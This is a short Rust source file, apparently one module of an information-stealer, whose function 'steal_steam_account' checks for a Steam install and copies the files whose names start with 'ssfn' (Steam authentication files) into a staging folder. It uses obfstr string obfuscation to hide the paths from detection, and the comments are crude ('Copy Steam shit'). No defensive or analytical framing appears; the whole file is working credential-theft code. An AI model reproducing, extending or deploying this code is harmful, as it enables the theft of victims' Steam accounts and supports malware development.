use walkdir::*;

fn is_ssfn(entry: &DirEntry) -> bool {
    entry.file_name()
         .to_str()
         .map(|s| s.starts_with(obfstr::obfstr!("ssfn")))
         .unwrap_or(false)
}


pub fn steal_steam_account(path: String) -> Option<String> {


    if std::path::Path::new(obfstr::obfstr!("C:\\Program Files (x86)\\Steam\\")).exists() {
        let _ = std::fs::create_dir(format!("{path}\\{}\\", obfstr::obfstr!("steam"))); // Made for easy replacement


      for entry in WalkDir::new(obfstr::obfstr!("C:\\Program Files (x86)\\Steam\\")).max_depth(1).into_iter().filter_map(|f| f.ok()) {
           

            if !is_ssfn(&entry) {
                continue;
            }

            
            std::fs::copy(entry.path(), &format!("{path}\\{steam}\\{name}", steam=obfstr::obfstr!("steam"),name=entry.file_name().to_str().unwrap())).ok()?; // Copy Steam shit
        }


    }
    Some("Steam".to_string())

}
